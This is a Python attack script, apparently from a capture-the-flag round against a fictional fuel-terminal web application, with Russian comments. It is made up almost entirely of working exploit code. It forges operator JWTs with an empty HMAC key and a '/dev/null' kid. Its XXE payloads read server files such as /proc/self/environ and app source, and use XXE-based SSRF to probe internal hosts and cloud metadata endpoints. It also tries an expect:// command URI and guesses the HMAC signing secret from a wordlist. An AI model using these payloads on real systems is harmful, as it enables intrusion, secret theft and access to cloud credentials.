#!/usr/bin/env python3
"""round48 — localhost HTTP entity, 500 error detail, sign dump, resolv.conf, hex keys"""
import requests, time, json, hmac as hm, hashlib, base64

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

def xxe_entity(uri, field="remarks"):
    """Тест XXE с произвольным URI (не только file://)"""
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "{uri}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        t0 = time.time()
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml.encode(), headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        elapsed = time.time() - t0
        if r.status_code == 200:
            try:
                d = r.json()
                val = d.get("summary",{}).get(field,"")
                return r.status_code, val, elapsed
            except:
                return r.status_code, r.text[:500], elapsed
        else:
            return r.status_code, r.text[:500], elapsed
    except Exception as e:
        return -1, str(e)[:200], 0

# ============================================================
print("="*70)
print("PHASE 1: HTTP ENTITY НА LOCALHOST — SSRF ЧЕРЕЗ XXE")
print("="*70)

# Тестируем HTTP entity на localhost
# Если lxml блокирует только ВНЕШНИЙ HTTP, localhost может работать!
localhost_uris = [
    # Приложение на порту 3000 (gunicorn)
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:3000/api/auth/me",
    "http://localhost:3000/",
    "http://localhost:3000/api/auth/me",
    # Приложение через переменную PORT
    "http://127.0.0.1:8000/",
    "http://127.0.0.1:8007/",
    "http://127.0.0.1:5000/",
    # Nginx proxy
    "http://127.0.0.1:80/",
    # Docker DNS
    "http://127.0.0.11:53/",
    # Другие контейнеры
    "http://172.18.0.3:5432/",
    "http://terminal-db:5432/",
    "http://gauge-gw.internal:9100/",
    "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
    # Metadata endpoints
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/",
    # AWS/GCP/Azure
    "http://metadata.google.internal/computeMetadata/v1/",
]

for uri in localhost_uris:
    code, val, elapsed = xxe_entity(uri)
    if code == 200 and val:
        print(f"\n  [200 {elapsed:.2f}s] {uri}:")
        print(f"    ДАННЫЕ: {val[:500]}")
    elif code == 200 and not val:
        print(f"  [200 empty {elapsed:.2f}s] {uri}")
    elif code == 400:
        print(f"  [400 {elapsed:.2f}s] {uri}: {val[:100]}")
    elif elapsed > 3:
        print(f"  [SLOW {code} {elapsed:.2f}s] {uri}")
    else:
        print(f"  [{code} {elapsed:.2f}s] {uri}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: ПОЛНЫЙ ДАМП 500 ОШИБОК — ИЩЕМ TRACEBACK")
print("="*70)

error_payloads = [
    {"url": [1,2,3], "sig": "test"},
    {"url": {"nested": True}, "sig": "test"},
    {"url": True, "sig": True},
    {"url": None, "sig": None},
    {"url": 0, "sig": 0},
    {"sig": "test"},  # без url
    {},  # пустой
    {"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"},  # без sig
]

for payload in error_payloads:
    try:
        r = S.post(f"{CASPI}/api/ops/probe",
            json=payload, headers=AUTH_OP, timeout=5)
        if r.status_code >= 500:
            print(f"\n  [{r.status_code}] payload={json.dumps(payload)[:50]}:")
            print(f"  Headers: {dict(r.headers)}")
            print(f"  Body ({len(r.text)} chars):")
            print(f"  {r.text[:2000]}")
        elif r.status_code != 403:
            print(f"  [{r.status_code}] {json.dumps(payload)[:50]}: {r.text[:100]}")
    except Exception as e:
        print(f"  [ERR] {json.dumps(payload)[:40]}: {e}")

# Также probe POST без JSON
for ct, data in [
    ("text/plain", "hello"),
    ("application/xml", "<test/>"),
    ("multipart/form-data", "test"),
    ("application/x-www-form-urlencoded", "url=test&sig=test"),
]:
    try:
        r = S.post(f"{CASPI}/api/ops/probe",
            data=data, headers={**AUTH_OP, "Content-Type": ct}, timeout=5)
        if r.status_code >= 500:
            print(f"\n  [{r.status_code}] Content-Type={ct}:")
            print(f"  {r.text[:1000]}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: ПОЛНЫЙ SIGN RESPONSE DUMP")
print("="*70)

for dev in ["lm-01", "tk-01"]:
    try:
        r = S.get(f"{CASPI}/api/ops/probe/sign",
            params={"device": dev}, headers=AUTH_OP, timeout=5)
        print(f"\n  device={dev}:")
        print(f"  Status: {r.status_code}")
        print(f"  Headers: {dict(r.headers)}")
        d = r.json()
        print(f"  JSON keys: {list(d.keys())}")
        for k, v in d.items():
            print(f"    {k}: {v}")
    except Exception as e:
        print(f"  Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: /etc/resolv.conf И СЕТЕВЫЕ ФАЙЛЫ")
print("="*70)

net_files = [
    "/etc/resolv.conf",
    "/etc/nsswitch.conf",
    "/etc/host.conf",
    "/etc/protocols",
    "/etc/services",
    "/etc/ssl/openssl.cnf",
]

for fp in net_files:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"\n  {fp}:")
        for line in val.split('\n')[:10]:
            print(f"    {line}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: HEX-DECODED И ПРОИЗВОДНЫЕ КЛЮЧИ")
print("="*70)

known_url = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
known_sig = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

# Hex-decoded варианты
hex_keys = [
    bytes.fromhex("5407f6317f5c"),  # hostname as hex bytes
    bytes.fromhex("5407f6317f5c00"),  # with null
    # MD5 hashes
    hashlib.md5(b"probe_secret").digest(),
    hashlib.md5(b"CaspiTerminal").digest(),
    hashlib.md5(b"terminal_web_pw").digest(),
    hashlib.md5(b"5407f6317f5c").digest(),
    # SHA256 hashes
    hashlib.sha256(b"probe_secret").digest(),
    hashlib.sha256(b"CaspiTerminal").digest(),
    hashlib.sha256(b"terminal_web_pw").digest(),
    hashlib.sha256(b"5407f6317f5c").digest(),
    # SHA256 hex strings as keys
    hashlib.sha256(b"probe_secret").hexdigest().encode(),
    hashlib.sha256(b"CaspiTerminal").hexdigest().encode(),
    hashlib.sha256(b"terminal_web_pw").hexdigest().encode(),
    hashlib.sha256(b"5407f6317f5c").hexdigest().encode(),
    # MD5 hex strings as keys
    hashlib.md5(b"probe_secret").hexdigest().encode(),
    hashlib.md5(b"CaspiTerminal").hexdigest().encode(),
    # UUID-like
    b"5407f631-7f5c-4000-8000-000000000000",
]

labels = [
    "hex(hostname)", "hex(hostname+null)",
    "MD5(probe_secret)", "MD5(CaspiTerminal)", "MD5(terminal_web_pw)", "MD5(hostname)",
    "SHA256(probe_secret)", "SHA256(CaspiTerminal)", "SHA256(terminal_web_pw)", "SHA256(hostname)",
    "SHA256hex(probe_secret)", "SHA256hex(CaspiTerminal)", "SHA256hex(terminal_web_pw)", "SHA256hex(hostname)",
    "MD5hex(probe_secret)", "MD5hex(CaspiTerminal)",
    "UUID(hostname)",
]

for key, label in zip(hex_keys, labels):
    h = hm.new(key, known_url, hashlib.sha256).hexdigest()
    if h == known_sig:
        print(f"\n  НАЙДЕН! {label} = {key!r} <<<<<<")
        break
else:
    print("  Hex/derived keys не совпали")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: ЕЩЁ БОЛЬШЕ СЛОВ — ИЗ СТРАНИЦЫ")
print("="*70)

# Из HTML контента
page_words = [
    # BIN и коды
    b"041240001357", b"APT-AKTAU-01", b"apt-aktau-01",
    b"APT_AKTAU_01", b"APTAKTAU01",
    # Телефон
    b"77292301405", b"+77292301405", b"7292301405",
    b"30-14-05", b"301405",
    # Email
    b"ops@caspiterminal.kz", b"ops",
    # LLP
    b"CaspiTerminal LLP", b"caspiterminal.kz",
    # Location
    b"Aktau Sea Port", b"aktau_sea_port",
    b"mangystau_region", b"industrial_zone",
    # Gauge-GW related
    b"gauge-gw", b"gauge_gw", b"gaugegw",
    b"gauge-gw.internal", b"gauge-gw.internal:9100",
    # From CSS/HTML
    b"0e2233", b"f2a20c", b"9fb8cc",  # CSS цвета
    # Operations
    b"field-device", b"field_device",
    b"diagnostics", b"custody-transfer",
    b"custody_transfer", b"tank_farm",
    # Mixed
    b"Fuel Storage", b"fuel_storage",
    b"Distribution", b"distribution",
    # Reversed LLEHS variations
    b"LLEHS_PROBE", b"llehs_probe", b"PROBE_LLEHS",
    b"SHELL_REVERSE", b"reverse_shell",
    b"LLEHS9000", b"llehs9000",
    # Maybe it's a passphrase
    b"the quick brown fox",
    b"pump_it_up", b"oil_is_life",
    b"black_gold", b"liquid_gold",
    # Docker compose project
    b"khs-oil-depot", b"khs_oil_depot",
    b"KHS-OIL-DEPOT", b"khsoildepot",
    # CTF team
    b"kazhackstan", b"KazHackStan",
    b"kazhack", b"KAZHACK",
]

found = False
for key in page_words:
    h = hm.new(key, known_url, hashlib.sha256).hexdigest()
    if h == known_sig:
        print(f"\n  НАЙДЕН! key={key!r} <<<<<<")
        found = True
        break
    h2 = hm.new(key + b"\n", known_url, hashlib.sha256).hexdigest()
    if h2 == known_sig:
        print(f"\n  НАЙДЕН! key={key!r}+'\\n' <<<<<<")
        found = True
        break

if not found:
    print("  Слова из страницы не совпали")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: /proc/self/maps — LOADED PYTHON MODULES")
print("="*70)

st, val = xxe_read("/proc/self/maps")
if st == "OK":
    lines = val.split('\n')
    seen = set()
    for line in lines:
        parts = line.split()
        if len(parts) >= 6:
            fpath = parts[5]
            if fpath not in seen and fpath.startswith('/'):
                seen.add(fpath)

    # Показываем все уникальные файлы (не стандартные библиотеки)
    interesting = sorted([f for f in seen if
        '/app/' in f or 'site-packages' in f or
        'secret' in f.lower() or 'probe' in f.lower() or
        'config' in f.lower() or 'flask' in f.lower() or
        'lxml' in f.lower() or 'hmac' in f.lower()])

    if interesting:
        print("  Интересные загруженные файлы:")
        for f in interesting:
            print(f"    {f}")

    # Все Python пакеты
    packages = sorted(set([f.split('site-packages/')[-1].split('/')[0]
        for f in seen if 'site-packages/' in f]))
    if packages:
        print(f"\n  Установленные Python пакеты:")
        for p in packages:
            print(f"    {p}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: ЧТЕНИЕ ЧЕРЕЗ kid ORACLE — ПРОВЕРКА СОДЕРЖИМОГО ФАЙЛОВ")
print("="*70)

# Если мы установим kid на файл и подпишем JWT правильным ключом,
# мы получим 200. Это позволяет ВЕРИФИЦИРОВАТЬ содержимое файла.
# Но нужно знать и файл, и содержимое.

# Проверяем: содержимое каких файлов мы ТОЧНО знаем?
# /etc/hostname = "5407f6317f5c\n" — уже подтверждено

# Проверяем gunicorn.conf.py — мы его читали, знаем содержимое
st, val = xxe_read("/app/gunicorn.conf.py")
if st == "OK" and val:
    print(f"  gunicorn.conf.py ({len(val)} chars):")
    print(f"  {val[:500]}")

    # Проверим: может gunicorn.conf.py содержит probe_secret?
    for kw in ["secret", "probe", "PROBE", "KEY", "key", "sign", "hmac"]:
        if kw.lower() in val.lower():
            print(f"  *** Ключевое слово '{kw}' найдено в gunicorn.conf.py! ***")

# requirements.txt
st, val = xxe_read("/app/requirements.txt")
if st == "OK" and val:
    print(f"\n  requirements.txt ({len(val)} chars):")
    print(f"  {val}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: CREATIVE — ДРУГИЕ ENCODING/WRAPPING ТРЮКИ")
print("="*70)

# Тест 1: XML 1.1 (позволяет некоторые control chars, но НЕ null)
xml11 = '''<?xml version="1.1" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file:///proc/self/environ">]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>&x;</remarks>
</ticket>'''

try:
    r = S.post(f"{CASPI}/api/ops/custody/ingest",
        data=xml11.encode(), headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
    print(f"  XML 1.1 + environ: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  XML 1.1 + environ: [ERR] {e}")

# Тест 2: UTF-16 encoding declaration
xml16 = '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file:///app/app.py">]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>&x;</remarks>
</ticket>'''

try:
    # Отправляем как UTF-8, объявляем как UTF-16
    r = S.post(f"{CASPI}/api/ops/custody/ingest",
        data=xml16.encode(), headers={**AUTH_OP, "Content-Type":"application/xml; charset=utf-8"}, timeout=10)
    print(f"  UTF-16 declared + app.py: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  UTF-16 declared + app.py: [ERR] {e}")

# Тест 3: Реальная UTF-16 кодировка
try:
    xml_utf16 = '''<?xml version="1.0"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file:///app/app.py">]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>&x;</remarks>
</ticket>'''
    data_16 = xml_utf16.encode('utf-16')
    r = S.post(f"{CASPI}/api/ops/custody/ingest",
        data=data_16, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
    print(f"  Real UTF-16 + app.py: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  Real UTF-16 + app.py: [ERR] {e}")

# Тест 4: Попытка чтения app.py через PHP-style filter (для полноты)
for uri in [
    "php://filter/convert.base64-encode/resource=/app/app.py",
    "compress.zlib://file:///app/app.py",
    "expect://id",
]:
    code, val, elapsed = xxe_entity(uri)
    if code == 200 and val:
        print(f"\n  [{code}] {uri}: {val[:200]}")
    else:
        print(f"  [{code}] {uri}: пусто или ошибка")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 10: READING gunicorn.conf.py ЧЕРЕЗ kid ORACLE")
print("="*70)

# Полностью читаем gunicorn.conf.py и requirements.txt
# чтобы проверить, не содержат ли они секретов

# Также проверяем наличие /app/wsgi.py, /app/run.py
for fp in ["/app/wsgi.py", "/app/run.py", "/app/main.py",
           "/app/create_app.py", "/app/application.py"]:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"\n  [НАЙДЕН!] {fp}:")
        print(val[:1000])
    elif st == "BIN":
        print(f"  [BIN] {fp}")

print("\n"+"="*70)
print("DONE")
print("="*70)
